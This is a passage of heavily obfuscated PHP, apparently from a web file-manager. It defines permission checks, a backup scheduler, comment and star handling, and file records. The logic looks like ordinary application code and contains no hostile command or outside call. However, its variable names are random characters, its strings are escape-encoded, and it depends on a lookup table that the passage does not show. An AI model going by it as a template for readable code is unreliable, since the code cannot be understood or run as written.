authCheckShare($ì‚Ò‰ŞÄ) { return self::authCheck($ì‚Ò‰ŞÄ, self::AUTH_SHARE); } public static function authCheckComment($¹ ëÖºú) { return self::authCheck($¹ ëÖºú, self::AUTH_COMMENT); } public static function authCheckEvent($¸•×õÉ€) { return self::authCheck($¸•×õÉ€, self::AUTH_EVENT); } public static function authCheckRoot($‹è ¥§—) { return self::authCheck($‹è ¥§—, self::AUTH_ROOT); } public static function authCheckAction($Í±‰ÕÚè, $ØÒÕü¬ª) { $é§‰ñ¼’ =& $_SERVER[ú÷îèÆÜ]; $­¾úî”÷ = array($é§‰ñ¼’[1903] => self::AUTH_VIEW, $é§‰ñ¼’[1235] => self::AUTH_DOWNLOAD, $é§‰ñ¼’[117] => self::AUTH_UPLOAD, $é§‰ñ¼’[1853] => self::AUTH_EDIT, $é§‰ñ¼’[1852] => self::AUTH_REMOVE, $é§‰ñ¼’[1863] => self::AUTH_SHARE, $é§‰ñ¼’[407] => self::AUTH_COMMENT, $é§‰ñ¼’[1673] => self::AUTH_EVENT, $é§‰ñ¼’[1904] => self::AUTH_ROOT); if (!isset($­¾úî”÷[$ØÒÕü¬ª])) { return; } $Î¬™õõ“ = $­¾úî”÷[$ØÒÕü¬ª]; $Í±‰ÕÚè = intval($Í±‰ÕÚè); if ($Í±‰ÕÚè <= 0) { return !1; } if (($Í±‰ÕÚè & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Í±‰ÕÚè & $Î¬™õõ“); } public static function authDisable($Ğ…ÓÖÈã, $¯ûÅ¬–Ç) { if (intval($Ğ…ÓÖÈã) <= 0) { return 0; } return intval($Ğ…ÓÖÈã) & ~$¯ûÅ¬–Ç; } public $optionType = "\123\171\x73\x74\145\155\56\163\x6f\165\162\143\x65\x41\x75\x74\x68\114\x69\163\x74"; public $field = array("\156\x61\x6d\145", "\141\165\x74\150", "\x6c\x61\142\x65\x6c", "\x64\x69\x73\160\x6c\x61\x79", "\163\x79\163\x74\x65\155", "\x73\x6f\x72\164"); public function initData() { $ÂëÆŞıÔ = $this->authDefault(); foreach ($ÂëÆŞıÔ as $ ì¹ş ¼) { $this->add($ ì¹ş ¼); } } public function findAuth($§·ˆ°Ÿà, $„“õ±Âö) { $–ãá§ğ =& $_SERVER[ú÷îèÆÜ]; $®Ò‚‹åƒ = parent::listData(); foreach ($®Ò‚‹åƒ as $¤¸Ğâ‰¹) { $Ö÷Ù†Í† = intval($¤¸Ğâ‰¹[$–ãá§ğ[464]]); if ($Ö÷Ù†Í† <= 0 || $¤¸Ğâ‰¹[$–ãá§ğ[1905]] == 0) { continue; } if (($Ö÷Ù†Í† & $§·ˆ°Ÿà) != $§·ˆ°Ÿà) { continue; } if (($Ö÷Ù†Í† & $„“õ±Âö) != 0) { continue; } return $¤¸Ğâ‰¹[$–ãá§ğ[452]]; } return !1; } public function findAuthReadOnly() { $¥çÔİâ± = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Ü¦å¨Ä¡ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($¥çÔİâ±, $Ü¦å¨Ä¡); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ãåÍ¡¦Ü =& $_SERVER[ú÷îèÆÜ]; $­êå²şî = parent::listData(); $äôî¥»ò = !1; foreach ($­êå²şî as $Û¼ÅÆö) { if ($Û¼ÅÆö[$ãåÍ¡¦Ü[464]] <= 0 || $Û¼ÅÆö[$ãåÍ¡¦Ü[1905]] == $ãåÍ¡¦Ü[222]) { continue; } if (!$äôî¥»ò) { $äôî¥»ò = $Û¼ÅÆö; continue; } if ($äôî¥»ò[$ãåÍ¡¦Ü[464]] > $Û¼ÅÆö[$ãåÍ¡¦Ü[464]]) { $äôî¥»ò = $Û¼ÅÆö; } } return $äôî¥»ò ? $äôî¥»ò[$ãåÍ¡¦Ü[452]] : $ãåÍ¡¦Ü[22]; } public function listData($¢¬âüàè = false, $ŒĞÔß¡³ = "\x73\157\x72\x74", $¤×°èªÀ = false) { return parent::listData($¢¬âüàè, $ŒĞÔß¡³, $¤×°èªÀ); } public function update($òÓ™ôÓĞ, $§ûøó±Ñ) { $âÍîŸ¡ˆ =& $_SERVER[ú÷îèÆÜ]; $šµ¥¸ë = parent::listData($òÓ™ôÓĞ); $“‹Ïôå¼ = $this->findByName($§ûøó±Ñ[$âÍîŸ¡ˆ[42]]); if (!$šµ¥¸ë || $“‹Ïôå¼ && $“‹Ïôå¼[$âÍîŸ¡ˆ[452]] != $šµ¥¸ë[$âÍîŸ¡ˆ[452]]) { return !1; } $this->filterAuth($§ûøó±Ñ[$âÍîŸ¡ˆ[464]]); return parent::update($òÓ™ôÓĞ, $§ûøó±Ñ); } public function remove($Ç’äƒ¨Ë) { $úİæÃïæ = parent::listData($Ç’äƒ¨Ë); if (!$úİæÃïæ || $úİæÃïæ[$_SERVER[ú÷îèÆÜ][189]]) { return !1; } return parent::remove($Ç’äƒ¨Ë); } public function add($ç§ÑñÑ„ = array()) { $ô«øê« =& $_SERVER[ú÷îèÆÜ]; if ($this->findByName($ç§ÑñÑ„[$ô«øê«[42]])) { return !1; } $ëÄè†œÀ = array($ô«øê«[42] => $ô«øê«[22], $ô«øê«[464] => 1, $ô«øê«[1906] => $ô«øê«[1893], $ô«øê«[1905] => 1, $ô«øê«[189] => 0, $ô«øê«[1907] => 0); $ç§ÑñÑ„ = array_merge($ëÄè†œÀ, $ç§ÑñÑ„); $ç§ÑñÑ„[$ô«øê«[1907]] = $this->getSort(); $this->filterAuth($ç§ÑñÑ„[$ô«øê«[464]]); return parent::insert($ç§ÑñÑ„); } private function getSort() { $Òá¶¯¢ =& $_SERVER[ú÷îèÆÜ]; $íİà™‚³ = parent::listData(); $ĞÜºÑÓ = array_to_keyvalue($íİà™‚³, $Òá¶¯¢[22], $Òá¶¯¢[1907]); return empty($ĞÜºÑÓ) ? 0 : max($ĞÜºÑÓ) + 1; } private function filterAuth(&$ªµËƒ«•) { if (!$ªµËƒ«•) { return; } $œ²”øÖÌ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $‹¡¹ÊÕÈ = array(); foreach ($œ²”øÖÌ as $‰ÈÃŠğĞ) { if ($ªµËƒ«• & $‰ÈÃŠğĞ) { $‹¡¹ÊÕÈ[] = $‰ÈÃŠğĞ; } } if (in_array(self::AUTH_ROOT, $‹¡¹ÊÕÈ)) { $ªµËƒ«• = array_sum($œ²”øÖÌ); return; } $Ò½¥€ã… = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($‹¡¹ÊÕÈ as $‰ÈÃŠğĞ) { if (isset($Ò½¥€ã…[$‰ÈÃŠğĞ])) { $‹¡¹ÊÕÈ = array_merge($‹¡¹ÊÕÈ, $Ò½¥€ã…[$‰ÈÃŠğĞ]); } } $‹¡¹ÊÕÈ[] = self::AUTH_SHOW; $ªµËƒ«• = array_sum(array_unique($‹¡¹ÊÕÈ)); } public function sort($–‰Ú²·Ù, $ÍÇİñïõ) { return parent::update($–‰Ú²·Ù, $ÍÇİñïõ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\x62\x61\x63\x6b\x75\x70\114\151\163\164"; public $field = array("\151\x6f", "\156\141\155\x65", "\x73\x74\141\164\x75\163", "\143\157\156\164\145\x6e\x74", "\155\141\156\165\x61\154", "\162\x65\163\165\154\164", "\164\151\155\x65\106\x72\157\155", "\164\x69\155\x65\x54\x6f"); public function config() { $“ß·êõÃ =& $_SERVER[ú÷îèÆÜ]; $î¤ğ‚è = Model($“ß·êõÃ[810])->get($“ß·êõÃ[820]); $î¤ğ‚è = json_decode($î¤ğ‚è, !0); $î¤ğ‚è = is_array($î¤ğ‚è) ? $î¤ğ‚è : array(); if (!isset($î¤ğ‚è[$“ß·êõÃ[794]])) { $î¤ğ‚è[$“ß·êõÃ[794]] = $“ß·êõÃ[98]; } unset($î¤ğ‚è[$“ß·êõÃ[1655]]); Action($“ß·êõÃ[1908])->taskInit(); Model($“ß·êõÃ[1654])->cacheClear(); $ÂÛ¿ÈİÊ = $“ß·êõÃ[1909]; $ú°ÅĞ¼‘ = Model($“ß·êõÃ[1910])->findByKey($“ß·êõÃ[1673], $ÂÛ¿ÈİÊ); if (!$ú°ÅĞ¼‘) { $ú°ÅĞ¼‘ = array(); } if (isset($ú°ÅĞ¼‘[$“ß·êõÃ[204]])) { $ú°ÅĞ¼‘[$“ß·êõÃ[204]] = json_decode($ú°ÅĞ¼‘[$“ß·êõÃ[204]], !0); } if (isset($î¤ğ‚è[$“ß·êõÃ[204]])) { $ú°ÅĞ¼‘[$“ß·êõÃ[204]][$“ß·êõÃ[1658]] = $î¤ğ‚è[$“ß·êõÃ[204]]; unset($î¤ğ‚è[$“ß·êõÃ[204]]); } return array_merge($ú°ÅĞ¼‘, $î¤ğ‚è); } public function listData($¶ìœÆ¢ì = false, $×¬ä‹åÁ = "\x6d\x6f\144\151\146\171\124\x69\155\x65", $—âşÁ¥„ = false) { return parent::listData($¶ìœÆ¢ì, $×¬ä‹åÁ, !0); } public function lastItem() { $¬‹ÑšØÀ = $this->listData(); return !empty($¬‹ÑšØÀ[0]) ? $¬‹ÑšØÀ[0] : null; } public function kill($íª‘Âšô) { $«ï Ğ«¹ =& $_SERVER[ú÷îèÆÜ]; $¨Ò•ÆÚñ = $this->listData($íª‘Âšô); if (!$¨Ò•ÆÚñ || empty($¨Ò•ÆÚñ[$«ï Ğ«¹[42]])) { return !0; } Task::kill($«ï Ğ«¹[819]); Task::kill($«ï Ğ«¹[840]); Task::kill($«ï Ğ«¹[849]); $™¯÷²÷Ë = $¨Ò•ÆÚñ[$«ï Ğ«¹[42]]; $éİı´˜€ = TEMP_FILES . $«ï Ğ«¹[818] . $™¯÷²÷Ë . $«ï Ğ«¹[18]; IO::remove($éİı´˜€, !1); return $this->remove($íª‘Âšô); } public function remove($ÙäÌßÓ¶) { $’ÒÇû­ = $this->listData($ÙäÌßÓ¶); if (!$’ÒÇû­) { return !0; } return $this->backupRemove($’ÒÇû­); } private function backupRemove($à¥›÷øŠ) { parent::remove($à¥›÷øŠ[$_SERVER[ú÷îèÆÜ][452]]); $ƒÇÊ£¾“ = $this->backupPath($à¥›÷øŠ); IO::remove($ƒÇÊ£¾“, !1); return !0; } private function backupPath($¿Àæ›ş) { $³ùôî± =& $_SERVER[ú÷îèÆÜ]; $¤ıºëÆş = $¿Àæ›ş[$³ùôî±[42]]; $¦‘û€×­ = Model($³ùôî±[810])->get($³ùôî±[811]); $¬ş°ù®¦ = substr(md5($³ùôî±[812] . $¦‘û€×­ . $¤ıºëÆş), 0, 8); return "\173\151\x6f\x3a{$¿Àæ›ş[$³ùôî±[791]]}\x7d\57\144\x61\x74\x61\x62\141\163\x65\57\142\141\x63\153\x75\160\57" . $¤ıºëÆş . $³ùôî±[21] . $¬ş°ù®¦; } public function start() { $ï»è•´á =& $_SERVER[ú÷îèÆÜ]; if ($GLOBALS[$ï»è•´á[16]][$ï»è•´á[99]][$ï»è•´á[1911]] != $ï»è•´á[98]) { return !0; } $Èˆú¡‰† = $this->config(); if (!$Èˆú¡‰† || $Èˆú¡‰†[$ï»è•´á[1655]] != $ï»è•´á[98]) { return !1; } $™‘²êïÀ = $this->process(); foreach ($™‘²êïÀ as $âæÈÀ²€) { if ($âæÈÀ²€) { return Task::restart($âæÈÀ²€[$ï»è•´á[452]]); } } $«²ö»ßÚ = new Backup(); $Óû²Á² = $«²ö»ßÚ->db(); if ($Óû²Á²) { $Óû²Á² = $«²ö»ßÚ->dbFile(); if ($Óû²Á² && $Èˆú¡‰†[$ï»è•´á[794]] == $ï»è•´á[222]) { $Óû²Á² = $«²ö»ßÚ->file(); } } Backup::set(array($ï»è•´á[790] => 1, $ï»è•´á[801] => time())); return !0; } public function process() { $ß ş’Å =& $_SERVER[ú÷îèÆÜ]; $ùû®­Ó¸ = array($ß ş’Å[797] => Task::get($ß ş’Å[819]), $ß ş’Å[802] => Task::get($ß ş’Å[840]), $ß ş’Å[224] => Task::get($ß ş’Å[849])); $Òºâ²Šş = !1; foreach ($ùû®­Ó¸ as &$µ™õÆ¶) { if ($Òºâ²Šş) { $µ™õÆ¶ = !1; continue; } if ($µ™õÆ¶) { $ÂÙ€ôÂ¶ = intval(_get($µ™õÆ¶, $ß ş’Å[1690], 0)); if (time() - $ÂÙ€ôÂ¶ > 7200) { Task::kill($µ™õÆ¶[$ß ş’Å[452]]); $Òºâ²Šş = !0; $µ™õÆ¶ = !1; } } } return $ùû®­Ó¸; } public function restore() { $şŒ¢Æë¿ =& $_SERVER[ú÷îèÆÜ]; ActionCall($şŒ¢Æë¿[1101], !0, 1); ActionCall($şŒ¢Æë¿[1101], !0, 0); } } goto BËíÂÌÎ˜á; BËíÂÌÎ˜á: class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\155\145\156\164"; protected $tableMeta = array("\164\x61\x62\154\145\x4e\x61\x6d\145" => "\x63\157\x6d\155\145\x6e\x74\x5f\155\x65\164\x61", "\x6d\145\x74\141\106\151\145\x6c\144" => "\x63\157\155\155\145\156\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($×ÏÖ–) { $´‹¸îæé =& $_SERVER[ú÷îèÆÜ]; if ($×ÏÖ–[$´‹¸îæé[1912]]) { $ñ«ÂŠğù = $this->where(array($´‹¸îæé[1913] => $×ÏÖ–[$´‹¸îæé[1912]]))->find(); if (!$ñ«ÂŠğù || $ñ«ÂŠğù[$´‹¸îæé[188]] != $×ÏÖ–[$´‹¸îæé[188]] || $ñ«ÂŠğù[$´‹¸îæé[547]] != $×ÏÖ–[$´‹¸îæé[547]]) { return !1; } $this->where(array($´‹¸îæé[1913] => $×ÏÖ–[$´‹¸îæé[1912]]))->setAdd($´‹¸îæé[1914], 1); } $×ÏÖ–[$´‹¸îæé[1915]] = 0; $×ÏÖ–[$´‹¸îæé[1914]] = 0; $×ÏÖ–[$´‹¸îæé[790]] = 1; return $this->add($×ÏÖ–); } public function commentCount($Ñ÷…‘ìï, $¸µ——ëò, $†ÏÎÎÑ = false) { $ğÒ•å¶ =& $_SERVER[ú÷îèÆÜ]; if (!$Ñ÷…‘ìï) { return array(); } if (is_string($Ñ÷…‘ìï) || is_int($Ñ÷…‘ìï)) { $Ñ÷…‘ìï = array($Ñ÷…‘ìï); } $úÀË = array($ğÒ•å¶[547], $ğÒ•å¶[1916] => $ğÒ•å¶[542]); $Ñº£®½ = array($ğÒ•å¶[547] => array($ğÒ•å¶[17], $Ñ÷…‘ìï), $ğÒ•å¶[188] => $¸µ——ëò); if ($†ÏÎÎÑ) { $Ñº£®½[$ğÒ•å¶[1685]] = $†ÏÎÎÑ; } $°ÅˆŒ¸ü = $this->field($úÀË)->where($Ñº£®½)->group($ğÒ•å¶[547])->select(); return array_to_keyvalue($°ÅˆŒ¸ü, $ğÒ•å¶[547], $ğÒ•å¶[542]); } public function starTarget($¾§× À´, $£İÂë‹) { $©Å°ş =& $_SERVER[ú÷îèÆÜ]; $ù™Ñûâº = $¾§× À´ + self::TYPE_STAR_OFFSET; $Ù¦ÆºÉº = array($©Å°ş[1685] => USER_ID, $©Å°ş[188] => $ù™Ñûâº, $©Å°ş[547] => $£İÂë‹); $ŠåÓãÆÁ = $this->where($Ù¦ÆºÉº)->find(); if ($ŠåÓãÆÁ) { return $this->where(array($©Å°ş[452] => $ŠåÓãÆÁ[$©Å°ş[452]]))->delete(); } $«ˆ³ÇÄÅ = array($©Å°ş[1912] => 0, $©Å°ş[1685] => USER_ID, $©Å°ş[790] => 1, $©Å°ş[794] => $©Å°ş[22], $©Å°ş[188] => $ù™Ñûâº, $©Å°ş[547] => $£İÂë‹, $©Å°ş[1915] => 0, $©Å°ş[1914] => 0); return $this->add($«ˆ³ÇÄÅ); } public function starTargetCount($ Ã•ˆĞŠ, $Ø­æø¥Û) { $ò«³ã¿ =& $_SERVER[ú÷îèÆÜ]; $³‰ú¹øŠ = $Ø­æø¥Û + self::TYPE_STAR_OFFSET; $…±ì«¹ = $this->commentCount($ Ã•ˆĞŠ, $³‰ú¹øŠ); $›ƒ‰Ò›é = $this->commentCount($ Ã•ˆĞŠ, $³‰ú¹øŠ, USER_ID); return array($ò«³ã¿[1917] => $…±ì«¹, $ò«³ã¿[1918] => $›ƒ‰Ò›é); } public function starTargetUserList($ğÄÉûÓ«, $»‚ë×ì‡) { $Èı†ˆ©Ë =& $_SERVER[ú÷îèÆÜ]; $â§‘Ê„† = $ğÄÉûÓ« + self::TYPE_STAR_OFFSET; $ü¯Ÿğ«ñ = array($Èı†ˆ©Ë[547] => $»‚ë×ì‡, $Èı†ˆ©Ë[188] => $â§‘Ê„†); $û†ß‘ÉØ = $this->where($ü¯Ÿğ«ñ)->count(); $Ş£ÏçåÔ = array($Èı†ˆ©Ë[308] => $û†ß‘ÉØ, $Èı†ˆ©Ë[1919] => array()); if (!$û†ß‘ÉØ) { return $Ş£ÏçåÔ; } $ß›ìı”Ë = $this->field($Èı†ˆ©Ë[1685])->where($ü¯Ÿğ«ñ)->limit(500)->select(); $ß›ìı”Ë = array_to_keyvalue($ß›ìı”Ë, $Èı†ˆ©Ë[22], $Èı†ˆ©Ë[1685]); $Ş£ÏçåÔ[$Èı†ˆ©Ë[1919]] = Model($Èı†ˆ©Ë[555])->userListInfo($ß›ìı”Ë); return $Ş£ÏçåÔ; } public function prasiseUserList($ëÖøÈú„) { $¿ØÜªº =& $_SERVER[ú÷îèÆÜ]; $İı‘à† = array($¿ØÜªº[1920] => $ëÖøÈú„); $ÊÅ÷ÜŸ– = $this->where($İı‘à†)->find(); $Æ¡Š–ï¢ = _get($ÊÅ÷ÜŸ–, $¿ØÜªº[1915], 0); $»êèñ—¹ = array($¿ØÜªº[308] => $Æ¡Š–ï¢, $¿ØÜªº[1919] => array()); if (!$Æ¡Š–ï¢) { return $»êèñ—¹; } $åŸùãİÆ = Model($¿ØÜªº[1921])->field($¿ØÜªº[1685])->where($İı‘à†)->limit(500)->select(); $åŸùãİÆ = array_to_keyvalue($åŸùãİÆ, $¿ØÜªº[22], $¿ØÜªº[1685]); $»êèñ—¹[$¿ØÜªº[1919]] = Model($¿ØÜªº[555])->userListInfo($åŸùãİÆ); return $»êèñ—¹; } public function remove($ˆØµ”½’) { $ä…ß‚èÅ =& $_SERVER[ú÷îèÆÜ]; $®º³ˆŸî = array($ä…ß‚èÅ[1913] => $ˆØµ”½’); $Ö¦Õßª¨ = $this->where($®º³ˆŸî)->find(); if ($Ö¦Õßª¨[$ä…ß‚èÅ[1912]]) { $this->where(array($ä…ß‚èÅ[1913] => $Ö¦Õßª¨[$ä…ß‚èÅ[1912]]))->setAdd($ä…ß‚èÅ[1914], -1); } return $this->where($®º³ˆŸî)->delete(); } public function edit($ğÚä«˜ö, $¦²ÄÇÄş) { $Ç½€Å¬× =& $_SERVER[ú÷îèÆÜ]; $ØÇ³×¹æ = array($Ç½€Å¬×[1913] => $ğÚä«˜ö); return $this->where($ØÇ³×¹æ)->save(array($Ç½€Å¬×[1922] => $¦²ÄÇÄş)); } public function prasise($Ğ–ê‹ñì) { $®Óù©åÏ =& $_SERVER[ú÷îèÆÜ]; $È„àá¢í = Model($®Óù©åÏ[1923]); $®óüÕ³ƒ = array($®Óù©åÏ[1913] => $Ğ–ê‹ñì, $®Óù©åÏ[1676] => USER_ID); $²ÛÀ•™¡ = $È„àá¢í->where($®óüÕ³ƒ)->find(); if (!$²ÛÀ•™¡) { $È„àá¢í->add($®óüÕ³ƒ); $°‚‰ƒ¢ˆ = $this->where(array($®Óù©åÏ[1913] => $Ğ–ê‹ñì))->setAdd($®Óù©åÏ[1915], 1); } else { $È„àá¢í->where($®óüÕ³ƒ)->delete(); $°‚‰ƒ¢ˆ = $this->where(array($®Óù©åÏ[1913] => $Ğ–ê‹ñì))->setAdd($®Óù©åÏ[1915], -1); } return $°‚‰ƒ¢ˆ; } public function targetInfo($ÃÚØÆ“Ä, $¡ÚÅ¼ÛÌ) { $šé€Ğ¡ =& $_SERVER[ú÷îèÆÜ]; $‡ÛÀÉ½š = array($šé€Ğ¡[625] => $ÃÚØÆ“Ä, $šé€Ğ¡[626] => $¡ÚÅ¼ÛÌ); $è“¨ªßÚ = $this->where($‡ÛÀÉ½š)->count(); $˜ä§¾Êƒ = "\122\111\x47\110\124\x20\x4a\x4f\111\x4e\40{$this->tablePrefix}\143\157\x6d\155\145\156\x74\137\160\162\x61\x69\163\145\x20\x73\164\x61\x72\40\157\156\40\143\157\155\155\145\x6e\164\56\143\x6f\x6d\x6d\145\x6e\x74\x49\x44\40\x3d\40\163\x74\141\162\x2e\143\157\x6d\x6d\x65\156\164\x49\x44"; $÷ÉÅè‘ = $this->alias($šé€Ğ¡[407])->where($‡ÛÀÉ½š)->join($˜ä§¾Êƒ, $šé€Ğ¡[1924])->count(); $ŸÜ•æ±” = array($šé€Ğ¡[1925] => $è“¨ªßÚ, $šé€Ğ¡[1926] => $÷ÉÅè‘); return $ŸÜ•æ±”; } public function listData($şşû°ş…) { $ì«ö‘ßö =& $_SERVER[ú÷îèÆÜ]; if (isset($şşû°ş…[$ì«ö‘ßö[1927]])) { if ($şşû°ş…[$ì«ö‘ßö[1927]]) { $şşû°ş…[$ì«ö‘ßö[1920]] = array($ì«ö‘ßö[1055], intval($şşû°ş…[$ì«ö‘ßö[1927]])); } unset($şşû°ş…[$ì«ö‘ßö[1927]]); } if (isset($şşû°ş…[$ì«ö‘ßö[1928]])) { if ($şşû°ş…[$ì«ö‘ßö[1928]]) { $şşû°ş…[$ì«ö‘ßö[1920]] = array($ì«ö‘ßö[1052], intval($şşû°ş…[$ì«ö‘ßö[1928]])); } unset($şşû°ş…[$ì«ö‘ßö[1928]]); } return $this->_listData($şşû°ş…); } private function _listData($„ŞÉ¯ŒÈ) { $ª«¼¯¨í =& $_SERVER[ú÷îèÆÜ]; $¡«Áô†Ì = $this->where($„ŞÉ¯ŒÈ)->_makeOrder()->selectPage(100); $this->_listAppendParent($¡«Áô†Ì[$ª«¼¯¨í[422]]); $this->_listAppendUser($¡«Áô†Ì[$ª«¼¯¨í[422]]); $this->_listAppendMeta($¡«Áô†Ì[$ª«¼¯¨í[422]]); return $¡«Áô†Ì; } private function _makeOrder() { $¥Ô«ÌÁø =& $_SERVER[ú÷îèÆÜ]; $»À¡ûÎÛ = array($¥Ô«ÌÁø[1915], $¥Ô«ÌÁø[1914], $¥Ô«ÌÁø[225]); $¼óäÏáş = Input::get($¥Ô«ÌÁø[507], $¥Ô«ÌÁø[17], $¥Ô«ÌÁø[474], $»À¡ûÎÛ); $ç­§”İĞ = Input::get($¥Ô«ÌÁø[508], $¥Ô«ÌÁø[17], $¥Ô«ÌÁø[1678], array($¥Ô«ÌÁø[1929], $¥Ô«ÌÁø[503])); $”ú“†£ = $¼óäÏáş . $¥Ô«ÌÁø[63] . $ç­§”İĞ; return $this->order($”ú“†£); } private function _listAppendParent(&$¨”¤áø‘) { $³¶½À¤Ñ =& $_SERVER[ú÷îèÆÜ]; $¤ê˜‹¦ö = array_unique(array_to_keyvalue($¨”¤áø‘, $³¶½À¤Ñ[22], $³¶½À¤Ñ[1912])); $¤ê˜‹¦ö = array_remove_value($¤ê˜‹¦ö, $³¶½À¤Ñ[222]); if (!$¤ê˜‹¦ö) { return; } $©Õñ´¬ö = $this->where(array($³¶½À¤Ñ[1913] => array($³¶½À¤Ñ[17], $¤ê˜‹¦ö)))->select(); $©Õñ´¬ö = array_to_keyvalue($©Õñ´¬ö, $³¶½À¤Ñ[1920]); foreach ($¨”¤áø‘ as &$™äçÚ¤í) { if (isset($©Õñ´¬ö[$™äçÚ¤í[$³¶½À¤Ñ[1912]]])) { $™äçÚ¤í[$³¶½À¤Ñ[1930]] = $©Õñ´¬ö[$™äçÚ¤í[$³¶½À¤Ñ[1912]]]; } } unset($™äçÚ¤í); } private function _listAppendUser(&$“ÂÇŒ”…) { $µÌåÏÔÀ =& $_SERVER[ú÷îèÆÜ]; $Ä¶ı Ó = array_unique(array_to_keyvalue($“ÂÇŒ”…, $µÌåÏÔÀ[22], $µÌåÏÔÀ[1685])); $Ä¶ı Ó = array_remove_value($Ä¶ı Ó, $µÌåÏÔÀ[222]); if (count($Ä¶ı Ó) == 0) { return; } foreach ($“ÂÇŒ”… as $Šéƒ•–) { if (isset($Šéƒ•–[$µÌåÏÔÀ[1930]])) { $Ä¶ı Ó[] = $Šéƒ•–[$µÌåÏÔÀ[1930]][$µÌåÏÔÀ[1685]]; } } $õ´›¦¦Š = Model($µÌåÏÔÀ[576])->userListInfo($Ä¶ı Ó); foreach ($“ÂÇŒ”… as &$Šéƒ•–) { $Šéƒ•–[$µÌåÏÔÀ[639]] = $õ´›¦¦Š[$Šéƒ•–[$µÌåÏÔÀ[1685]]]; if (isset($Šéƒ•–[$µÌåÏÔÀ[1930]])) { $Šéƒ•–[$µÌåÏÔÀ[1930]][$µÌåÏÔÀ[639]] = $õ´›¦¦Š[$Šéƒ•–[$µÌåÏÔÀ[1930]][$µÌåÏÔÀ[1685]]]; } } unset($Šéƒ•–); } private function _listAppendMeta(&$ş±ĞÂÃ÷) { $ÑŸ¢…ˆ¡ =& $_SERVER[ú÷îèÆÜ]; $»³€ëâ¬ = array_unique(array_to_keyvalue($ş±ĞÂÃ÷, $ÑŸ¢…ˆ¡[22], $ÑŸ¢…ˆ¡[1920])); $»³€ëâ¬ = array_remove_value($»³€ëâ¬, $ÑŸ¢…ˆ¡[222]); if (!$»³€ëâ¬) { return; } foreach ($ş±ĞÂÃ÷ as $Ê¿Ù ¤Ë) { if (isset($Ê¿Ù ¤Ë[$ÑŸ¢…ˆ¡[1930]])) { $»³€ëâ¬[] = $Ê¿Ù ¤Ë[$ÑŸ¢…ˆ¡[1930]][$ÑŸ¢…ˆ¡[1920]]; } } $‘ÆµéÅà = $this->metaList($»³€ëâ¬); if (!$‘ÆµéÅà) { return !1; } foreach ($ş±ĞÂÃ÷ as &$Ê¿Ù ¤Ë) { $Ê¿Ù ¤Ë[$ÑŸ¢…ˆ¡[516]] = $‘ÆµéÅà[$Ê¿Ù ¤Ë[$ÑŸ¢…ˆ¡[1920]]]; if (isset($Ê¿Ù ¤Ë[$ÑŸ¢…ˆ¡[1930]])) { $Ê¿Ù ¤Ë[$ÑŸ¢…ˆ¡[1930]][$ÑŸ¢…ˆ¡[516]] = $‘ÆµéÅà[$Ê¿Ù ¤Ë[$ÑŸ¢…ˆ¡[1930]][$ÑŸ¢…ˆ¡[1920]]]; } } unset($Ê¿Ù ¤Ë); } private function metaList($ù¬Æè‹×) { $óî£©—Š =& $_SERVER[ú÷îèÆÜ]; if (!$ù¬Æè‹×) { return array(); } $İ†åŞİ‘ = array($óî£©—Š[1920] => array($óî£©—Š[17], $ù¬Æè‹×)); $¼ƒÀüİí = Model($óî£©—Š[1931])->where($İ†åŞİ‘)->select(); $¼ƒÀüİí = array_to_keyvalue_group($¼ƒÀüİí, $óî£©—Š[1920]); foreach ($¼ƒÀüİí as $Ùâ—´ş‰ => $ùö£ŒÖ„) { $íà¹š¡ô = array(); foreach ($ùö£ŒÖ„ as $É³îìšÃ) { $íà¹š¡ô[$É³îìšÃ[$óî£©—Š[104]]] = $É³îìšÃ[$óî£©—Š[427]]; } $¼ƒÀüİí[$Ùâ—´ş‰] = $íà¹š¡ô; } return $¼ƒÀüİí ? $¼ƒÀüİí : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\x69\154\145\x5f\143\157\156\164\x65\x6e\x74\x73"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\x65\x54\151\x6d\145", "\164\151\x6d\145", "\151\156\163\145\162\x74", "\x66\x75\x6e\x63\x74\x69\157\156")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\154\145"; protected $tableMeta = array("\x74\x61\x62\154\x65\116\x61\155\x65" => "\151\x6f\137\146\x69\x6c\x65\x5f\155\145\x74\141", "\x6d\145\164\x61\106\151\145\154\x64" => "\146\151\154\145\x49\x44"); public function fileInfo($µÎ®şî¥) { $Ú ‹ü‡ì =& $_SERVER[ú÷îèÆÜ]; static $¨×ÓÉ = array(); if (!isset($¨×ÓÉ[$µÎ®şî¥])) { $ïı¶à¹ = $Ú ‹ü‡ì[1932]; $ñß¼Æö = Model($Ú ‹ü‡ì[521])->field($ïı¶à¹)->where(array($Ú ‹ü‡ì[519] => $µÎ®şî¥))->find(); $¨×ÓÉ[$µÎ®şî¥] = $ñß¼Æö; } return $¨×ÓÉ[$µÎ®şî¥]; } public function addFileByContent($àÑ„ÄÄö = '', $¿µÒªÙ° = '') { $÷÷ÏÜ»ö =& $_SERVER[ú÷îèÆÜ]; $¸ó‚„» = TEMP_PATH . $÷÷ÏÜ»ö[1933]; if (!is_dir($¸ó‚„»)) { mk_dir($¸ó‚„»); } $ë¥ü ØÙ = $¸ó‚„» . 